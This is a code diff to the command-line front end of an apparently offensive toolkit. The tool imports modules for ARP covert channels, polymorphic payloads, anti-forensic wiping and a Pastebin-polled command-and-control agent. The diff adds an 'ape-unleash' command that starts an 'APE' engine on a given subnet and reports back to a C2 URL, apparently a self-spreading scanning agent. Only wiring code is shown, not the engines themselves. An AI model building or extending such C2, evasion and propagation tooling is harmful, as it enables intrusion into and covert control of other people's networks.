@@ -19,6 +19,7 @@ from modules.wizard import encode_wizard
 from modules.covert_channel import send_arp_covert, listen_arp_covert
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
 from modules.anti_forensics import scorched_earth
+from modules.ape import unleash_ape
 import subprocess
 
 def load_config(config_path='config.json'):
@@ -145,6 +146,11 @@ def main():
     c2_parser = subparsers.add_parser("c2-agent", help="Start the C2 agent")
     c2_parser.add_argument("--url", required=True, help="The Pastebin URL to poll for commands")
     c2_parser.add_argument("--interval", type=int, default=60, help="Polling interval in seconds")
+
+    # APE
+    ape_parser = subparsers.add_parser("ape-unleash", help="Unleash the APE engine")
+    ape_parser.add_argument("--c2-url", required=True, help="C2 URL for the APE to report back to")
+    ape_parser.add_argument("--subnet", required=True, help="Initial subnet for the APE to scan")
 
 
     args = parser.parse_args()
@@ -293,6 +299,9 @@ def main():
 
         elif args.command == "c2-agent":
             c2_agent(args.url, args.interval)
+
+        elif args.command == "ape-unleash":
+            unleash_ape(args.c2_url, args.subnet)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
